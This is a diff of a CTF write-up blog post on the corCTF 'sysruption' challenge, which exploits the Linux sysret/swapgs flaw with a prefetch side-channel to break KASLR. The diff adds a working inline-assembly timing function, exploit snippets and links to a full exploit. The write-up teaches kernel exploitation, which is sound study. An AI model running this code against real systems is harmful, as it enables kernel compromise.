@@ -1,22 +1,14 @@
 ---
 layout: single
 title:  "corCTF: sysruption writeup"
-date: 2023-06-17
+date: 2023-07-30
 classes: wide
 tags:
   - Exploitation
   - Sidechannels
   - Linux
-  - CTF
+  - CTF Writeup
 ---
-
-<style>
-.caption {
-  text-align: center;
-  font-size: .8rem !important;
-  color: lightgrey;
-}
-</style>
 
 I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!
 
@@ -30,6 +22,31 @@ As described by the challenge text, sysruption is about:
 > A hardware quirk, a micro-architecture attack, and a kernel exploit all in one!
 
 So pretty much a combination of my favorite research topics :D
+
+Plus it had this sick motd!
+
+```
+  ██████ ▓██   ██▓  ██████  ██▀███   █    ██  ██▓███  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █
+▒██    ▒  ▒██  ██▒▒██    ▒ ▓██ ▒ ██▒ ██  ▓██▒▓██░  ██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █
+░ ▓██▄     ▒██ ██░░ ▓██▄   ▓██ ░▄█ ▒▓██  ▒██░▓██░ ██▓▒▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
+  ▒   ██▒  ░ ▐██▓░  ▒   ██▒▒██▀▀█▄  ▓▓█  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
+▒██████▒▒  ░ ██▒▓░▒██████▒▒░██▓ ▒██▒▒▒█████▓ ▒██▒ ░  ░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
+▒ ▒▓▒ ▒ ░   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒
+░ ░▒  ░ ░ ▓██ ░▒░ ░ ░▒  ░ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░▒ ░         ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
+░  ░  ░   ▒ ▒ ░░  ░  ░  ░    ░░   ░  ░░░ ░ ░ ░░         ░       ▒ ░░ ░ ░ ▒     ░   ░ ░
+      ░   ░ ░           ░     ░        ░                        ░      ░ ░           ░
+          ░ ░
+```
+
+dist:
+[patch](/assets/corctf-sysruption/dist/patch.diff)
+[bzImage](/assets/corctf-sysruption/dist/bzImage)
+[initramfs](/assets/corctf-sysruption/dist/initramfs.cpio.gz)
+[kconfig](/assets/corctf-sysruption/dist/kconfig)
+
+exploit:
+[exploit.c](/assets/corctf-sysruption/exploit.c)
+[exploit](/assets/corctf-sysruption/exploit)
 
 ## patchwork
 
@@ -213,7 +230,7 @@ entry_SYSCALL_64:
     sysretq
 ```
 
-But since swapgs was executed right before sysret and the GP handler sees that the GP was from kernel mode (CPL was 0) swapgs is not executed again in the GP handler, meaning it executes with a userspace gsbase. This becomes a problem when the GP handler tries to access percpu variables since user space gsbase is usually unused and set to zero and results in a pagefault when.
+But since swapgs was executed right before sysret and the GP handler sees that the GP was from kernel mode (CPL was 0) swapgs is not executed again in the GP handler, meaning it executes with a userspace gsbase. This becomes a problem when the GP handler tries to access percpu variables since user space gsbase is usually unused and set to zero so that results in a pagefault.
 
 Lets take a deeper look at what is going on in the GP handler.
 
@@ -228,7 +245,8 @@ asm_exc_general_protection:
     call   exc_general_protection
     jmp    error_return
 ```
-When a GP occurs execution is redirected to the handler above, which immediately calls into `error_entry`. The `error_entry` function is pretty generic and shared across many of the fault/trap handlers of the kernel, the start of `error_entry` is:
+
+When a GP occurs, execution is redirected to the handler above, which immediately calls into `error_entry`. The `error_entry` function is pretty generic and shared across many of the fault/trap handlers of the kernel, the start of `error_entry` is:
 
 ```nasm
 error_entry:
@@ -280,7 +298,7 @@ exc_general_protection:
 
 So how can we survive this?
 
-In the ptrace sysret blog, the author survives the double fault by targetintg the Interrupt Descriptor Table (IDT) in order to hijack the page fault handler to userspace. Unfortunately, we are living in the future meaning we don't have a writeable IDT and SMEP would anyways prevent us from executing off a user space page. So I had to find some other way to survive triggering the bug.
+In the ptrace sysret blog, the author survives the double fault by targeting the Interrupt Descriptor Table (IDT) in order to hijack the page fault handler to userspace. Unfortunately, we are living in the future meaning we don't have a writeable IDT and SMEP would anyways prevent us from executing off a user space page. So I had to find some other way to survive triggering the bug.
 
 Well the gsbase belongs to userspace, but can we control our own gsbase? can we make it point to a kernel address?
 
@@ -294,9 +312,9 @@ My first attempt was to have ptrace set gsbase since I was already using ptrace 
         return 0;
 ```
 
-The same is true of `arch_prctl(ARCH_SET_GS)` and probably sigreturn as well...
+The same is true of `arch_prctl(ARCH_SET_GS)` as well...
 
-Luckily x86 has an extension called fsgsbase that is commonly enabled, which lets gs base be set from user space via the wrgsbase instruction!
+Luckily x86 has an extension called fsgsbase that is commonly enabled, which lets gsbase be set from user space via the wrgsbase instruction!
 
 `asm volatile("wrgsbase %0" : : "r" (gsbase));`
 
@@ -319,6 +337,8 @@ For a simple implementation of a prefetch attack I reached for the [entrybleed p
 But that was simple enough, all I had to do was define some ranges and step sizes that work for physmap and add a flag to choose which randomization I want to break.
 
 ```c
+// largely based on: https://www.willsroot.io/2022/12/entrybleed.html
+
 #define KERNEL_LOWER_BOUND 0xffffffff80000000ull
 #define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
 
@@ -337,6 +357,33 @@ But that was simple enough, all I had to do was define some ranges and step size
 
 #define DUMMY_ITERATIONS 5
 #define ITERATIONS 100
+
+// https://www.willsroot.io/2022/12/entrybleed.html
+uint64_t sidechannel(uint64_t addr) {
+  uint64_t a, b, c, d;
+  asm volatile (".intel_syntax noprefix;"
+    "mfence;"
+    "rdtscp;"
+    "mov %0, rax;"
+    "mov %1, rdx;"
+    "xor rax, rax;"
+    "lfence;"
+    "prefetchnta qword ptr [%4];"
+    "prefetcht2 qword ptr [%4];"
+    "xor rax, rax;"
+    "lfence;"
+    "rdtscp;"
+    "mov %2, rax;"
+    "mov %3, rdx;"
+    "mfence;"
+    ".att_syntax;"
+    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
+    : "r" (addr)
+    : "rax", "rbx", "rcx", "rdx");
+  a = (b << 32) | a;
+  c = (d << 32) | c;
+  return c - a;
+}
 
 uint64_t prefetch(int phys)
 {
@@ -382,8 +429,8 @@ uint64_t prefetch(int phys)
 int main(int argc, char **argv) {
     struct user_regs_struct regs;
 
-    kaslr = prefetch(0) - 0xc00000;
-    phys = prefetch(1) - 0x100000000;
+    uint64_t kaslr = prefetch(0) - 0xc00000;
+    uint64_t phys = prefetch(1) - 0x100000000;
 
     printf("KERNEL base %lx\n", kaslr);
     printf("PHYS base %lx\n", phys);
@@ -754,9 +801,19 @@ gsbase: 0xffff8d913bc00000
 corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs manual.}
 ```
 
-After a few runs the prefetch attacks succeeded and it worked remotely too! flag!
-
+After a few runs the prefetch attacks succeeded and the exploit worked! flag!
 
 ## closing
 
-This challenge was awesome, I had been hoping someone would create a challenge around the sysret bug every since I learned about it.
+This challenge was awesome, I had been hoping someone would create a challenge around the sysret bug ever since I learned about it. So, thanks to FizzBuzz101 for creating this challenge!
+
+<style>
+.caption {
+  text-align: center;
+  font-size: .8rem !important;
+  color: lightgrey;
+}
+</style>
+
+
+
